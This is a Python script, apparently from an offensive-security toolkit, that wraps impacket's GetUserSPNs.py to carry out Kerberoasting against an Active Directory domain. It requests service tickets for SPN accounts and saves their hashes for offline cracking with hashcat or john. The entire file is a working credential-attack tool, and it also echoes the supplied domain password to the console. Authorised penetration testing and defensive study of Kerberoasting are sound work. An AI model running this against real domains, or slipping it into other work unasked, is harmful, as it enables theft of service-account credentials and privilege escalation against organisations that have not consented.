#!/usr/bin/env python3
"""
active-directory/kerberoast.py — Kerberoasting helper (impacket wrapper).

Requests service tickets for SPN accounts and saves hashes for offline
cracking with hashcat / john.

Usage:
  vex active-directory kerberoast -d <domain> -u <user> -p <pass> [-o <file>]
"""

import argparse
import shutil
import subprocess
import sys
from pathlib import Path


def parse_args():
    p = argparse.ArgumentParser(description="Kerberoasting via impacket GetUserSPNs.py")
    p.add_argument("-d", "--domain",   required=True, help="Target domain (e.g. corp.local)")
    p.add_argument("-u", "--user",     required=True, help="Domain username")
    p.add_argument("-p", "--password", required=True, help="Domain password")
    p.add_argument("-dc", "--dc-ip",   help="Domain controller IP (optional)")
    p.add_argument("-o", "--output",   help="Save hashes to this file")
    return p.parse_args()


def find_getuserspns() -> str | None:
    """Locate impacket's GetUserSPNs.py — works on Linux, macOS, and Windows."""
    import sysconfig

    # 1. In PATH (pip install impacket puts it here on all platforms)
    found = shutil.which("GetUserSPNs.py") or shutil.which("GetUserSPNs")
    if found:
        return found

    # 2. Derive from the active Python environment's script directory
    scripts_dir = Path(sysconfig.get_path("scripts"))
    for name in ("GetUserSPNs.py", "GetUserSPNs"):
        candidate = scripts_dir / name
        if candidate.exists():
            return str(candidate)

    # 3. Legacy hard-coded Linux paths
    legacy = [
        "/usr/share/doc/python3-impacket/examples/GetUserSPNs.py",
        "/usr/lib/python3/dist-packages/impacket/examples/GetUserSPNs.py",
    ]
    for c in legacy:
        if Path(c).exists():
            return c

    return None


def main():
    args = parse_args()
    spns_script = find_getuserspns()
    if spns_script is None:
        print("[-] impacket not found. Install with: pip3 install impacket", file=sys.stderr)
        sys.exit(1)

    target = f"{args.domain}/{args.user}:{args.password}"
    cmd = [sys.executable, spns_script, target, "-request"]
    if args.dc_ip:
        cmd += ["-dc-ip", args.dc_ip]
    if args.output:
        cmd += ["-outputfile", args.output]

    print(f"[*] Running: {' '.join(cmd)}")
    result = subprocess.run(cmd)
    sys.exit(result.returncode)


if __name__ == "__main__":
    main()
